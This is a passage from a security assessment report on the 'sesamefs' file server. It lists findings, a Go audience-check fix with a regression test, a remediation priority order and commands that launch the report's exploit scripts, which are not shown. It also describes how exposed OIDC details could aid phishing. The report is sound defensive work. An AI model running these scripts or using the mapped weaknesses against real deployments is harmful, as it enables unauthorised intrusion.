Clears the current instance's in-memory cache but does not propagate to peer instances in a multi-node deployment. A deactivated user remains reachable on peer nodes until the cache TTL expires (reported as 5 minutes elsewhere in the code).

**Fix:** Cassandra-backed revocation list consulted on every request, or short cache TTL (≤30 s) for session entries.

---

#### M-8 Seafile-compat PBKDF2 at 1000 iterations

**File:** `internal/crypto/crypto.go:62-65`.

Compat mode uses PBKDF2 with 1000 iterations, far below OWASP 2024 guidance (≥600k). Argon2id is available and preferred. This matters only for code paths that actually run through the PBKDF2 route (Seafile library encryption for legacy clients); audit which data paths land there.

---

#### M-9 OnlyOffice JWT TTL of 8 hours

**File:** `internal/api/v2/onlyoffice.go:242`.

Token-theft window is a full workday. Tighten to ≤1 h with refresh.

---

#### M-10 Frontend dependency CVEs

| Package | Version | CVE(s) | Notes |
|---|---|---|---|
| moment | 2.22.2 | CVE-2022-24785 (path traversal in locale), CVE-2022-31129 (ReDoS) | ReDoS weaponizable via file history timestamps |
| socket.io-client | 2.2.0 | CVE-2022-25867 (NPE DoS) | |
| crypto-js | 4.2.0 | CVE-2023-46233 (PBKDF2 weakness) | Audit actual usage in `frontend/src/pages/markdown-editor/` |
| url-parse | ^1.4.3 | CVE-2018-3774 (host confusion) | |
| React | 17.0.0 | EOL — no security updates | Plan migration to 18 |

None are direct RCE, but the ReDoS in client-side date parsing is reachable via user-controlled timestamps returned by the API.

---

### LOW / informational

- **`/api/v2.1/bootstrap` and `/api2/server-info` leak version (`11.0.0`), brand, feature flags, role list, storage class names, inline-preview extension list** unauth. Expected for an SPA, but trim to only what the unauthenticated UI needs.
- **`/health` and `/ready` expose per-component status** (database/storage). Minor recon aid — `/ready` returned a ~950-byte status blob on the pre-prod deployment, so expect the attacker to know your infra layout.
- **`/api/v2.1/auth/oidc/config` is reachable unauth** and returns the configured `issuer`, `client_id`, and scope list. Useful input for a targeted phishing campaign that spins up a pixel-perfect fake broker login page. Consider requiring auth, or at least stripping the `client_id` from the unauthenticated response.
- **`/api/v2.1/query-zip-progress` and `/api/v2.1/cancel-zip-task` return stub success unauth.** Not dangerous in isolation, but a sign the router mounts stubs on public prefixes; audit for drift.
- **Nonce check in `oidc.go:478` is conditional** — only enforced if the server emitted a nonce. Make it mandatory.
- **No `/debug/pprof`, `/debug/vars`, `.git`, `.env`, source maps, or swagger exposed.** Confirmed absent on the live pre-prod instance. Good.

**Reproduce:** [`low-info-disclosure.sh`](./exploit-scripts/low-info-disclosure.sh)

```bash
./docs/exploit-scripts/low-info-disclosure.sh --host https://storage.example.com
```

Prints the HTTP status and body length for each info endpoint. Use `-v` to see the full response bodies.

---

### LATENT / defense-in-depth

#### L-1 OIDC `aud` claim not validated (latent — not reachable in current code paths)

**File:** `internal/auth/oidc.go:437-438, 478-481` (`parseIDToken`).
**Severity:** **Latent / defense-in-depth.** The code defect is real and should be fixed, but in the current code paths no attacker-controlled JWT ever reaches `parseIDToken`. This finding was filed as Critical in an earlier draft; live code tracing downgraded it after confirming the reach path does not exist.

**The defect.** Signature, `iss`, `exp`, `nbf`, and optionally `nonce` are checked. `claims.Audience` is extracted into the struct but is **never compared to `config.ClientID`**. `configs/config.prod.yaml:89` has `validate_audience: true`, but the flag is not read on the verification path — effectively dead config.

**Why it isn't reachable today.** A chain of facts in the current code and topology blocks the only exploitable scenario:

| Fact | Source |
|---|---|
| `parseIDToken` is called from exactly one place: `ExchangeCode` | `internal/auth/oidc.go:341` |
| `ExchangeCode` is called from exactly two places: `HandleOIDCCallback` (browser login) and `handleOAuthCallback` (desktop client SSO handoff) | `internal/api/v2/auth.go:156`, `internal/api/server.go:2142` |
| Both handlers receive an **authorization code**, not a JWT, and pass it into `ExchangeCode` | `auth.go:144-156`, `server.go:2132-2146` |
| `ExchangeCode` POSTs to the broker's `/token` endpoint with sesamefs's own `client_id` and `client_secret` | `oidc.go:287-291` |
| The broker returns an `id_token` whose `aud` is bound to the requesting client — sesamefs itself — by construction | OIDC spec + broker discovery |
| `response_type` on the authorization request is hardcoded to `"code"` — no implicit, no hybrid, no fragment-borne `id_token` an attacker could replay | `oidc.go:266` |
| Signing-algorithm whitelist is enforced: RSA/ECDSA only, HS256 rejected. No algorithm-confusion attack via the HS256/JWKS-public-key trick. | `oidc.go:398-408` |

Net effect: every token that ever reaches `parseIDToken` was minted by the configured broker in response to a request authenticated as sesamefs, with `aud` bound to sesamefs's client id by construction. The missing audience comparison has nothing in front of it for an attacker to exploit.

**What would make it exploitable again.** This finding is one developer decision away from being Critical. It becomes reachable if any of the following happen:

1. A new endpoint that accepts an externally-supplied JWT is added — examples: a mobile SSO handoff that takes a raw `id_token` from the mobile app, a SAML-to-JWT bridge, a federation endpoint from a peer server, a "login with token" API for desktop clients, a switch to hybrid or implicit flow (`response_type=code id_token`) to support single-page-app style relying parties.
2. The broker is reconfigured to mint `id_token.aud` as something other than the client that authenticated at `/token` (this would be a broker bug, not an attack, but it's the only other path into the defect).
3. The broker is replaced with a generic public IdP that allows users to register their own clients and does not bind authorization codes to the originating client — enabling cross-client code injection chained with a broker that also mints `aud` based on the original authorizing client.

Because the defect is exactly one refactor away from a Critical, and because the fix is trivial, **it should still be fixed** as defense-in-depth. The treatment is a two-line code change plus a regression-preventing unit test.

**Fix (code):**

```go
// internal/auth/oidc.go — inside parseIDToken, after iss / nonce validation
if c.config.ValidateAudience {
    if claims.Audience == "" || claims.Audience != c.config.ClientID {
        return nil, fmt.Errorf("audience mismatch: got %q, expected %q",
            claims.Audience, c.config.ClientID)
    }
}
```

Also wire `validate_audience` from `configs/config.prod.yaml:89` so the intent expressed there becomes real, default it to `true`, and support a `config.oidc.additional_audiences` allow-list for deployments with multiple legitimate client ids on the same RP.

**Regression-preventing unit test.** Add `internal/auth/oidc_aud_test.go` with a focused assertion that `parseIDToken` refuses a wrong-audience token. This is the high-value reproduction for a latent defect — far more reliable than a live replay, which cannot be constructed without a new code path:

```go
// internal/auth/oidc_aud_test.go
package auth

import (
    "crypto/rand"
    "crypto/rsa"
    "testing"
    "time"

    "github.com/golang-jwt/jwt/v5"
)

// L-1 regression guard: parseIDToken must refuse a token whose audience does
// not match the configured ClientID, regardless of how the token arrives.
// Today the function is only reached from ExchangeCode, where the broker
// binds aud by construction — but any future code path that hands an
// externally-obtained id_token to parseIDToken would reintroduce the
// vulnerability. This test fails on unfixed code and passes after the
// audience check is wired in.
func TestParseIDToken_RejectsWrongAudience(t *testing.T) {
    // Minimal RSA signer the test owns end to end.
    priv, err := rsa.GenerateKey(rand.Reader, 2048)
    if err != nil {
        t.Fatal(err)
    }
    now := time.Now()
    tok := jwt.NewWithClaims(jwt.SigningMethodRS256, jwt.MapClaims{
        "iss":   "https://idp.example",
        "sub":   "victim@example.com",
        "aud":   "some-other-client",        // ← the bug: wrong audience
        "exp":   now.Add(time.Hour).Unix(),
        "iat":   now.Unix(),
        "email": "victim@example.com",
    })
    signed, err := tok.SignedString(priv)
    if err != nil {
        t.Fatal(err)
    }

    // Wire an OIDCClient whose JWKS returns this key and whose config
    // expects a DIFFERENT ClientID. Test helpers below are sketched; adapt
    // to whatever newTestOIDCClient pattern exists alongside the other
    // tests in this package.
    c := newTestOIDCClient(t, &priv.PublicKey, "sesamefs-client-id",
        "https://idp.example")

    _, err = c.parseIDToken(signed, "")
    if err == nil {
        t.Fatal("parseIDToken accepted a token with wrong aud — L-1 reproduced")
    }
}
```

The test fails on the current source and passes once the `if c.config.ValidateAudience { ... }` block above is added. Drop it into CI as a permanent regression guard — it is cheaper, faster, and strictly more reliable than any live replay script.

**Reproduce (live, future-proof).** The original exploit script is retained at [`c1-oidc-aud-not-validated.sh`](./exploit-scripts/c1-oidc-aud-not-validated.sh) but marked as "not reachable via current handlers" in its header. Its purpose is to fail closed if a future version of sesamefs ever adds a direct-token entry point and forgets to gate `parseIDToken` behind the audience check. In today's code paths it will always return exit 1 even on vulnerable builds, because there is no handler that accepts the replayed token — that is the finding's entire point.

---

## Findings explicitly **not** counted

These are things a reader might expect to see in the list but which are deliberately excluded, with the reason:

1. **Dev-mode superadmin** — with `AUTH_DEV_MODE=true` (the default of `docker compose up`), dev tokens bypass OIDC. This is a dev-convenience behavior. The [preflight gate](#production-prerequisites--the-preflight-gate) refuses to let a production deployment start with this value. The `AUTH_ALLOW_ANONYMOUS` option (implicit token injection for unauthenticated requests) was removed from the codebase.
2. **MinIO / OnlyOffice `:latest` Docker tags** — production deployment uses AWS S3 (not MinIO) and a pinned OnlyOffice build, per operator confirmation. Local compose uses `:latest` for evaluation convenience; the preflight catches the `change-me-to-a-random-string` OnlyOffice secret and the `minioadmin` S3 creds, which is where the real risk lived.
3. **Cassandra 5.0 CVE-2025-23015** — requires an authenticated CQL user; in the intended deployment Cassandra is on a private subnet with sesamefs as the sole client, so external reachability is zero. Patch on the next routine dependency update.

Exploit-script filenames still use the prefix from an earlier numbering (`c1-oidc-aud-not-validated.sh`, `c2-onlyoffice-ssrf.sh`, `c3-inline-svg-xss.sh`) for stability; the script headers explain which finding they map to in the current report.

---

## Follow-up on the preflight gate

The [preflight section at the top](#production-prerequisites--the-preflight-gate) covers the implementation that shipped with this assessment (bash script at `scripts/prod-preflight.sh`, `.env`-bootstrap via `--init-env`, wired into `docker-compose.yaml` under the `prod` profile, made mandatory via `docker-compose.prod-gate.yaml`). Two things are worth noting for the next iteration:

1. **Port the preflight into the Go binary.** The bash implementation is a great first step and is enforced by compose, but a deployment that bypasses compose (systemd unit, bare `sesamefs serve`, k8s Deployment with the Go binary) can skip it. Add a `ValidateProductionReadiness()` pass in `internal/config/config.go` that runs when `SESAMEFS_ENV=production` or when the listener is bound to a non-loopback address. It can re-use the same rules as the bash script — the bash version becomes the portable CI check, the Go version becomes the runtime fail-closed gate.
2. **Catch the `CORS allowed_origins: ["*"]` case.** The current script reads env vars only, so it cannot detect the CORS wildcard that lives inside `configs/config.prod.yaml`. The Go-side version naturally can. In the meantime, the `SKIP=config`-disabled check in the bash script already greps the mounted config file for `- "*"` under `allowed_origins` and warns — operators should leave `SKIP` unset (or at least not include `config`) when running in prod.

---

## Recommended priority order

**Immediate:**

- Ship the preflight gate in prod: run `docker compose -f docker-compose.yaml -f docker-compose.prod-gate.yaml --profile prod up -d` at every rollout, and add a CI job that runs `./scripts/prod-preflight.sh` against the prod env block before merge.
- **C-1** OnlyOffice callback — enforce JWT gate first, then add SSRF protections; rotate any default secret.
- **C-2** `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff` on user file serving; start planning the sandbox-origin move.
- **H-1** upgrade `golang-jwt/jwt` v5 to the patched release.

**This week:**

- **H-2** constant-time API-key compare; **H-3** repo-token account-status gate; **H-4** OIDC role allow-list + email-domain allow-list.
- **H-5** uniform 404 + rate limit on `/api/v2.1/share-links/:token/*`; confirm token entropy.
- **H-6** constant-time share-link cookie compare.
- **H-7** tighten auth-token rate limit, add upload/download throttles, enforce `max_upload_mb`.
- **H-8** zip-bomb protections.
- **L-1** land the two-line `validate_audience` fix **and** the regression unit test in `internal/auth/oidc_aud_test.go`. Cheap, permanent, protects against the most plausible regression.

**Next:**

- **M-3** security-headers middleware.
- **M-2** explicit CORS allow-list.
- **M-4** auth on avatar endpoint.
- **M-5** bind `/metrics` to an internal-only listener (don't rely on upstream nginx alone).
- **M-6** OIDC state TTL + sweeper.
- **M-7** distributed session revocation.
- **H-9** DNS-rebinding defense.
- **M-1** CSRF protection on `/auth/session` DELETE.
- **M-10** frontend dep upgrades; plan React 17 → 18.

**Planned:**

- **M-8** deprecate PBKDF2 compat path or raise iterations.
- **M-9** shorten OnlyOffice JWT TTL.

---

## Reproduction — script index

Each finding above carries its reproduction command inline. For the full index and the shared conventions (`--host`, `-k`, `-v`, exit codes), see [`./exploit-scripts/README.md`](./exploit-scripts/README.md). Full unauth sweep:

```bash
./docs/exploit-scripts/run-all-unauth.sh --host https://your-env.example.com
```

---

## Assessment environment

- **Static review**: full source tree at the commit this document sits in.
- **Live probing target**: a pre-production deployment of sesamefs fronted by an HTTPS reverse proxy, running in prod mode (real secrets, AWS S3, trusted custom OIDC broker). All probing used the unauthenticated portion of the exploit-script suite (`run-all-unauth.sh`) plus targeted code-path traces. No destructive probes were run live.
- **Preflight script**: exercised standalone in both failing (empty env → 11 failures) and passing (realistic prod env → 21 passes) modes. `--init-env` was verified idempotent: re-runs keep existing values; only dev defaults are replaced.
- **Assessment date**: 2026-04-09.
